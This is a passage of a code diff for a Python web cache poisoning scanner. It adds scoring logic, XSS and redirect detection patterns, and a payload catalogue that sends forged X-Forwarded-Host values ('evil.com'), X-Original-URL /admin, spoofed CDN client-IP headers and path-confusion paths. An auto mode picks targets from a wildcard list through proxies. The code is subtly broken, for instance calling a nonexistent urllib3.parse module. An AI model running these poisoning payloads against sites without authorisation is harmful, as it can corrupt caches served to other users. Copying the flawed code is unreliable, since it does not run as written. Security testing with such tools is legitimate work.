+            'header_reflection': 0.15,
+            'error_detection': 0.10,
+            'cdn_specific': 0.10,
+            'cache_key_match': 0.10,
+            'timing_analysis': 0.05,
+            'header_analysis': 0.05
+        }
+        
+        confidence = sum(score * weights[metric] for metric, score in validation_scores.items())
+        
+        fp_score = self.calculate_false_positive_score(
+            original_resp, poison_resp, verification_resps, validation_scores
+        )
+        
+        is_poisoned = (confidence >= self.min_confidence_threshold and 
+                      fp_score <= 0.05 and
+                      len(verification_resps) >= self.min_verification_requests)
+        
+        return AdvancedPoisonCheck(
+            is_poisoned=is_poisoned,
+            confidence=confidence,
+            technique=technique,
+            evidence={
+                'validation_scores': validation_scores,
+                'verification_count': len(verification_resps),
+                'false_positive_score': fp_score
+            },
+            verification_count=len(verification_resps),
+            false_positive_score=fp_score
+        )
+
+    def calculate_false_positive_score(self, original_resp: requests.Response,
+                                    poison_resp: requests.Response,
+                                    verification_resps: List[requests.Response],
+                                    validation_scores: Dict[str, float]) -> float:
+        fp_indicators = {
+            'dynamic_content': self.check_dynamic_content_fp(verification_resps),
+            'cache_inconsistency': self.check_cache_inconsistency_fp(verification_resps),
+            'error_responses': self.check_error_responses_fp(verification_resps),
+            'timing_anomalies': self.check_timing_anomalies_fp(verification_resps),
+            'header_anomalies': self.check_header_anomalies_fp(original_resp, verification_resps)
+        }
+        
+        weights = {
+            'dynamic_content': 0.3,
+            'cache_inconsistency': 0.25,
+            'error_responses': 0.2,
+            'timing_anomalies': 0.15,
+            'header_anomalies': 0.1
+        }
+        
+        fp_score = sum(score * weights[indicator] 
+                      for indicator, score in fp_indicators.items())
+                      
+        if self.matches_fp_patterns(poison_resp, verification_resps):
+            fp_score += 0.3
+            
+        return min(fp_score, 1.0)
+
+    def check_dynamic_content_fp(self, responses: List[requests.Response]) -> float:
+        dynamic_ratios = []
+        
+        for resp in responses:
+            content = self.normalize_response(resp)
+            ratio = self.calculate_dynamic_ratio(content)
+            dynamic_ratios.append(ratio)
+            
+        if len(dynamic_ratios) >= 2:
+            variance = statistics.variance(dynamic_ratios)
+            if variance > 0.1:
+                return 0.8
+                
+        avg_ratio = sum(dynamic_ratios) / len(dynamic_ratios)
+        if avg_ratio > self.max_dynamic_ratio:
+            return 0.6
+            
+        return 0.0
+
+    def validate_cache_key_match(self, original_resp: requests.Response,
+                               poison_resp: requests.Response,
+                               verification_resps: List[requests.Response]) -> float:
+        original_key = self.analyze_cache_key_components(original_resp)
+        poison_key = self.analyze_cache_key_components(poison_resp)
+        
+        shared_components = set(original_key.components) & set(poison_key.components)
+        total_components = set(original_key.components) | set(poison_key.components)
+        
+        if not total_components:
+            return 0.0
+            
+        component_similarity = len(shared_components) / len(total_components)
+        
+        sensitivity_match = all(
+            abs(original_key.sensitivity.get(comp, 0) - 
+                poison_key.sensitivity.get(comp, 0)) < 0.1
+            for comp in shared_components
+        )
+        
+        verification_keys = [
+            self.analyze_cache_key_components(resp)
+            for resp in verification_resps
+        ]
+        
+        key_consistency = all(
+            self.compare_cache_keys(poison_key, verify_key) > 0.9
+            for verify_key in verification_keys
+        )
+        
+        score = (
+            component_similarity * 0.4 +
+            (1.0 if sensitivity_match else 0.0) * 0.3 +
+            (1.0 if key_consistency else 0.0) * 0.3
+        )
+        
+        return score
+
+    def compare_cache_keys(self, key1: CacheKeyAnalysis, 
+                         key2: CacheKeyAnalysis) -> float:
+        if key1.normalized_key == key2.normalized_key:
+            return 1.0
+            
+        shared_components = set(key1.components) & set(key2.components)
+        total_components = set(key1.components) | set(key2.components)
+        
+        if not total_components:
+            return 0.0
+            
+        component_sim = len(shared_components) / len(total_components)
+        
+        sensitivity_diffs = []
+        for comp in shared_components:
+            sens1 = key1.sensitivity.get(comp, 0)
+            sens2 = key2.sensitivity.get(comp, 0)
+            sensitivity_diffs.append(abs(sens1 - sens2))
+            
+        avg_sens_diff = (
+            sum(sensitivity_diffs) / len(sensitivity_diffs)
+            if sensitivity_diffs else 1.0
+        )
+        
+        return component_sim * (1 - avg_sens_diff)
+
+    def analyze_response_timing(self, responses: List[requests.Response]) -> TimingAnalysis:
+        timings = [r.elapsed.total_seconds() for r in responses]
+        
+        if not timings:
+            return TimingAnalysis(0, [], 'unknown', 0)
+            
+        baseline = statistics.mean(timings[:3]) if len(timings) >= 3 else timings[0]
+        
+        mean = statistics.mean(timings)
+        stdev = statistics.stdev(timings) if len(timings) > 1 else 0
+        variance = statistics.variance(timings) if len(timings) > 1 else 0
+        
+        if stdev > self.timing_thresholds['anomaly'] * baseline:
+            pattern = 'anomalous'
+            anomaly_score = min(1.0, stdev / (baseline * 3))
+        elif variance > self.timing_thresholds['variance']:
+            pattern = 'variable'
+            anomaly_score = min(1.0, variance / self.timing_thresholds['variance'])
+        else:
+            pattern = 'consistent'
+            anomaly_score = 0.0
+            
+        return TimingAnalysis(
+            baseline_timing=baseline,
+            response_timings=timings,
+            timing_pattern=pattern,
+            anomaly_score=anomaly_score
+        )
+
+    def analyze_headers(self, response: requests.Response, test_headers: Dict) -> HeaderAnalysis:
+        reflected = {}
+        injection_points = []
+        context_risks = {}
+        
+        for header, value in test_headers.items():
+            reflections = self.find_header_reflections(response, header, str(value))
+            if reflections:
+                reflected[header] = reflections
+                
+                contexts = self.analyze_reflection_contexts(reflections)
+                if contexts['dangerous']:
+                    injection_points.append(header)
+                context_risks[header] = contexts['risk_score']
+        
+        risk_score = self.calculate_header_risk(
+            reflected, 
+            injection_points,
+            context_risks
+        )
+        
+        return HeaderAnalysis(
+            reflected_count=len(reflected),
+            reflection_patterns=reflected,
+            injection_points=injection_points,
+            risk_score=risk_score
+        )
+
+    def find_header_reflections(self, response: requests.Response, 
+                              header: str, value: str) -> List[str]:
+        reflections = []
+        
+        for resp_header, resp_value in response.headers.items():
+            if value in resp_value:
+                reflections.append(f"header:{resp_header}")
+        
+        content = response.text.lower()
+        value_lower = value.lower()
+        
+        patterns = [
+            value_lower,
+            re.escape(value_lower),
+            urllib3.parse.quote(value_lower),
+            urllib3.parse.quote_plus(value_lower)
+        ]
+        
+        for pattern in patterns:
+            matches = re.finditer(pattern, content)
+            for match in matches:
+                context = content[max(0, match.start()-20):min(len(content), match.end()+20)]
+                reflections.append(f"content:{context}")
+        
+        return reflections
+
+    def check_injection_point(self, header: str, reflections: List[str]) -> bool:
+        for reflection in reflections:
+            if reflection.startswith('content:'):
+                context = reflection.split(':', 1)[1]
+                
+                dangerous_contexts = [
+                    r'<script[^>]*>.*?</script>',
+                    r'javascript:',
+                    r'data:',
+                    r'src=["\']',
+                    r'href=["\']',
+                    r'url\(["\']?'
+                ]
+                
+                if any(re.search(pattern, context, re.I) for pattern in dangerous_contexts):
+                    return True
+                    
+        return False
+
+    def calculate_header_risk(self, reflected: Dict[str, List[str]],
+                            injection_points: List[str],
+                            context_risks: Dict[str, float]) -> float:
+        if not reflected:
+            return 0.0
+            
+        risk_factors = {
+            'reflection_count': len(reflected) / 10,
+            'injection_points': len(injection_points) / len(reflected) if reflected else 0,
+            'critical_headers': 0.0,
+            'context_risk': max(context_risks.values()) if context_risks else 0
+        }
+        
+        critical_headers = {
+            'host': 0.2,
+            'x-forwarded-host': 0.2,
+            'x-original-url': 0.15,
+            'x-rewrite-url': 0.15,
+            'x-forwarded-proto': 0.1,
+            'x-forwarded-scheme': 0.1
+        }
+        
+        for header in reflected:
+            if header.lower() in critical_headers:
+                current_risk = critical_headers[header.lower()]
+                if header in context_risks:
+                    current_risk *= (1 + context_risks[header])
+                risk_factors['critical_headers'] = max(
+                    risk_factors['critical_headers'],
+                    current_risk
+                )
+        
+        return min(1.0, sum(risk_factors.values()))
+
+    def analyze_reflection_contexts(self, reflections: List[str]) -> Dict:
+        contexts = {
+            'dangerous': False,
+            'risk_score': 0.0,
+            'contexts': []
+        }
+        
+        for reflection in reflections:
+            if reflection.startswith('content:'):
+                context = reflection.split(':', 1)[1]
+                
+                high_risk_patterns = [
+                    (r'<script[^>]*>.*?</script>', 0.9),
+                    (r'javascript:', 0.9),
+                    (r'data:', 0.8),
+                    (r'src=["\']', 0.7),
+                    (r'href=["\']', 0.6),
+                    (r'url\(["\']?', 0.5)
+                ]
+                
+                for pattern, risk in high_risk_patterns:
+                    if re.search(pattern, context, re.I):
+                        contexts['dangerous'] = True
+                        contexts['risk_score'] = max(contexts['risk_score'], risk)
+                        contexts['contexts'].append({
+                            'pattern': pattern,
+                            'risk': risk,
+                            'context': context
+                        })
+        
+        return contexts
+
+    def init_reflection_patterns(self) -> Dict[str, List[str]]:
+        return {
+            'html_context': [
+                r'<[^>]*?(?:src|href|action)\s*=\s*["\']([^"\']*)',
+                r'<meta[^>]*?content\s*=\s*["\']([^"\']*)',
+                r'url\(["\']?([^"\')]+)',
+            ],
+            'script_context': [
+                r'<script[^>]*?>.*?</script>',
+                r'javascript:.*?["\']([^"\']+)',
+                r'eval\(["\']([^"\']+)',
+            ],
+            'header_context': [
+                r'location:\s*([^\n]+)',
+                r'refresh:\s*\d+;\s*url=([^\n]+)',
+                r'content-security-policy.*?\'([^\']+)',
+            ]
+        }
+
+    def init_injection_signatures(self) -> List[Dict]:
+        return [
+            {
+                'type': 'xss',
+                'patterns': [
+                    r'<script[^>]*>.*?</script>',
+                    r'javascript:',
+                    r'onerror=',
+                    r'onload='
+                ],
+                'risk': 0.9
+            },
+            {
+                'type': 'open_redirect',
+                'patterns': [
+                    r'(https?:)?//[^/]+\.[^/]+/',
+                    r'\/\/[^/]+\.[^/]+\/',
+                    r'\\[^/]+\.[^/]+\\'
+                ],
+                'risk': 0.8
+            },
+            {
+                'type': 'cache_control',
+                'patterns': [
+                    r'cache-control:\s*([^\n]+)',
+                    r'x-cache:\s*([^\n]+)',
+                    r'age:\s*\d+'
+                ],
+                'risk': 0.7
+            }
+        ]
+
+    def init_fp_patterns(self) -> List[Dict]:
+        return [
+            {
+                'type': 'dynamic_content',
+                'patterns': [
+                    r'\b[0-9a-f]{32}\b',
+                    r'\b[0-9a-f]{40}\b',
+                    r'\b\d{10,13}\b',
+                    r'\b[0-9a-f]{8}(-[0-9a-f]{4}){3}-[0-9a-f]{12}\b'
+                ]
+            },
+            {
+                'type': 'common_headers',
+                'patterns': [
+                    r'x-request-id:\s*([^\n]+)',
+                    r'x-correlation-id:\s*([^\n]+)',
+                    r'etag:\s*([^\n]+)'
+                ]
+            }
+        ]
+
+    def generate_cache_key_variations(self) -> List[Dict]:
+        variations = []
+        
+        base_variations = {
+            'standard': {
+                'method': 'GET',
+                'headers': {},
+                'params': {}
+            },
+            'case_variation': {
+                'headers': {
+                    'Host': 'EXAMPLE.COM',
+                    'Accept': 'TEXT/HTML'
+                }
+            },
+            'encoding_variation': {
+                'headers': {
+                    'Accept-Encoding': ['gzip', 'deflate', 'br', '*']
+                }
+            },
+            'path_variation': {
+                'paths': [
+                    '/./path',
+                    '//path',
+                    '/path/',
+                    '/path/.',
+                    '/path?',
+                    '/path#'
+                ]
+            }
+        }
+        
+        header_variations = [
+            {'Host': 'example.com'},
+            {'X-Forwarded-Host': 'example.com'},
+            {'X-Host': 'example.com'},
+            {'X-Forwarded-Server': 'example.com'},
+            {'X-HTTP-Host-Override': 'example.com'},
+            {'X-Original-Host': 'example.com'}
+        ]
+        
+        scheme_variations = [
+            {'X-Forwarded-Proto': 'http'},
+            {'X-Forwarded-Proto': 'https'},
+            {'X-Forwarded-Scheme': 'http'},
+            {'X-Forwarded-Scheme': 'https'}
+        ]
+        
+        param_variations = [
+            {'cache': ['1', 'true', 'yes']},
+            {'no-cache': ['0', 'false', 'no']},
+            {'v': ['1', str(int(time.time()))]},
+            {'_': [str(int(time.time()))]},
+        ]
+        
+        variations.extend([
+            {
+                'type': var_type,
+                'config': config
+            } for var_type, config in base_variations.items()
+        ])
+        
+        for headers in header_variations:
+            variations.append({
+                'type': 'header_variation',
+                'config': {
+                    'headers': headers
+                }
+            })
+        
+        for scheme in scheme_variations:
+            variations.append({
+                'type': 'scheme_variation',
+                'config': {
+                    'headers': scheme
+                }
+            })
+        
+        for params in param_variations:
+            for param, values in params.items():
+                for value in values:
+                    variations.append({
+                        'type': 'param_variation',
+                        'config': {
+                            'params': {param: value}
+                        }
+                    })
+        
+        cdn_variations = {
+            'cloudflare': [
+                {'CF-Connecting-IP': '127.0.0.1'},
+                {'CF-IPCountry': 'XX'},
+                {'CF-Worker': 'true'}
+            ],
+            'fastly': [
+                {'Fastly-SSL': '1'},
+                {'Fastly-Force-Shield': '1'},
+                {'X-Fastly-Client-IP': '127.0.0.1'}
+            ],
+            'akamai': [
+                {'True-Client-IP': '127.0.0.1'},
+                {'Akamai-Origin-Hop': '1'},
+                {'X-Akamai-Cache-Key': 'custom-key'}
+            ]
+        }
+        
+        for cdn, headers_list in cdn_variations.items():
+            for headers in headers_list:
+                variations.append({
+                    'type': f'cdn_variation_{cdn}',
+                    'config': {
+                        'headers': headers
+                    }
+                })
+        
+        combination_variations = []
+        for i, var1 in enumerate(variations):
+            for var2 in variations[i+1:]:
+                if var1['type'] != var2['type']:
+                    combined_config = {
+                        'headers': {
+                            **var1.get('config', {}).get('headers', {}),
+                            **var2.get('config', {}).get('headers', {})
+                        },
+                        'params': {
+                            **var1.get('config', {}).get('params', {}),
+                            **var2.get('config', {}).get('params', {})
+                        }
+                    }
+                    combination_variations.append({
+                        'type': f"combined_{var1['type']}_{var2['type']}",
+                        'config': combined_config
+                    })
+        
+        variations.extend(random.sample(combination_variations, 
+                                     min(len(combination_variations), 10)))
+        
+        return variations
+
+    def load_poisoning_techniques(self) -> List[Dict]:
+        return [
+            {
+                'name': 'header_injection',
+                'description': 'Tests for header-based cache poisoning',
+                'headers': {
+                    'X-Forwarded-Host': ['evil.com', 'attacker.com'],
+                    'X-Original-URL': ['/admin', '/internal'],
+                    'X-Forwarded-Scheme': ['http', 'https']
+                },
+                'risk_level': 'high',
+                'validation_requirements': {
+                    'min_requests': 15,
+                    'confidence_threshold': 0.95,
+                    'verification_delay': 2.0
+                }
+            },
+            {
+                'name': 'parameter_pollution',
+                'description': 'Tests for cache key pollution via parameters',
+                'parameters': {
+                    'cache_buster': ['1', str(int(time.time()))],
+                    'orig_uri': ['/admin', '/internal'],
+                    'redirect_to': ['evil.com']
+                },
+                'risk_level': 'medium',
+                'validation_requirements': {
+                    'min_requests': 10,
+                    'confidence_threshold': 0.90,
+                    'verification_delay': 1.5
+                }
+            },
+            {
+                'name': 'cdn_specific',
+                'description': 'Tests CDN-specific poisoning vectors',
+                'vectors': {
+                    'cloudflare': {
+                        'headers': {
+                            'CF-Connecting-IP': ['127.0.0.1'],
+                            'X-Forwarded-For': ['127.0.0.1'],
+                            'CF-Worker': ['true']
+                        }
+                    },
+                    'fastly': {
+                        'headers': {
+                            'Fastly-SSL': ['1'],
+                            'Fastly-Force-Shield': ['1']
+                        }
+                    },
+                    'akamai': {
+                        'headers': {
+                            'True-Client-IP': ['127.0.0.1'],
+                            'Akamai-Origin-Hop': ['1']
+                        }
+                    }
+                },
+                'risk_level': 'high',
+                'validation_requirements': {
+                    'min_requests': 20,
+                    'confidence_threshold': 0.98,
+                    'verification_delay': 3.0
+                }
+            },
+            {
+                'name': 'path_confusion',
+                'description': 'Tests for cache poisoning via path confusion',
+                'paths': [
+                    '/./admin',
+                    '//admin',
+                    '/admin/',
+                    '/admin?',
+                    '/admin#',
+                    '/%2e/admin'
+                ],
+                'risk_level': 'medium',
+                'validation_requirements': {
+                    'min_requests': 12,
+                    'confidence_threshold': 0.92,
+                    'verification_delay': 2.0
+                }
+            }
+        ]
+
 def main():
-    parser = argparse.ArgumentParser(description='Web Cache Poison Detector')
-    parser.add_argument('-u', '--url', help='Target URL (optional, will use random targets if not specified)')
+    parser = argparse.ArgumentParser(
+        description='Web Cache Poison Detector',
+        formatter_class=argparse.RawDescriptionHelpFormatter
+    )
+    parser.add_argument('-u', '--url', help='Target URL')
     parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads')
     parser.add_argument('-o', '--output', help='Output JSON file')
-    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose output')
-    parser.add_argument('--timeout', type=int, default=10, help='Request timeout in seconds')
-    parser.add_argument('--proxy-list', help='Proxy list URL or file path')
+    parser.add_argument('--timeout', type=int, default=10, help='Request timeout')
+    parser.add_argument('--proxy-list', help='Proxy list file')
+    parser.add_argument('--auto', action='store_true', help='Auto-select targets from wildcards.txt')
     
     args = parser.parse_args()
     
-    # Set logging level based on verbose flag
-    if args.verbose:
-        logging.getLogger().setLevel(logging.DEBUG)
+    if not args.url and not args.auto:
+        parser.error("Either --url or --auto is required")
     
-    detector = CachePoisonDetector(
-        target_url=args.url,
-        threads=args.threads,
-        timeout=args.timeout,
-        proxy_list_url=args.proxy_list
-    )
-    
-    print("\n🔍 Starting Cache Poison Detection Scan\n")
-    results = detector.scan_all()
-    
-    if results:
-        print("\n🚨 Potential cache poisoning vulnerabilities found!")
-        print(f"Total vulnerabilities: {len(results)}")
+    try:
+        detector = CachePoisonDetector(
+            target_url=args.url,
+            threads=args.threads,
+            timeout=args.timeout,
+            proxy_list_url=args.proxy_list,
+            auto_mode=args.auto
+        )
         
-        if args.output:
+        results = detector.scan_all()
+        
+        if args.output and results:
             with open(args.output, 'w') as f:
                 json.dump(results, f, indent=2)
-            print(f"\n✅ Results saved to {args.output}")
+            CachePoisonUI.success(f"Results saved to {args.output}")
         
-        # Print summary of findings
-        print("\n📊 Summary of Findings:")
-        for idx, result in enumerate(results, 1):
-            print(f"""
-            Finding #{idx}:
-            - URL: {result['url']}
-            - Vulnerable Headers: {json.dumps(result['vulnerable_headers'], indent=2)}
-            - Confidence: {result['evidence']['confidence']}
-            - Indicators: {', '.join(result['evidence']['indicators'])}
-            """)
+        sys.exit(1 if results else 0)
         
+    except KeyboardInterrupt:
+        CachePoisonUI.error("\nScan interrupted by user")
         sys.exit(1)
-    else:
-        print("\n✅ No cache poisoning vulnerabilities detected")
-        sys.exit(0)
+    except Exception as e:
+        CachePoisonUI.error(f"Fatal error: {str(e)}")
+        sys.exit(1)
 
 if __name__ == "__main__":
     main() 
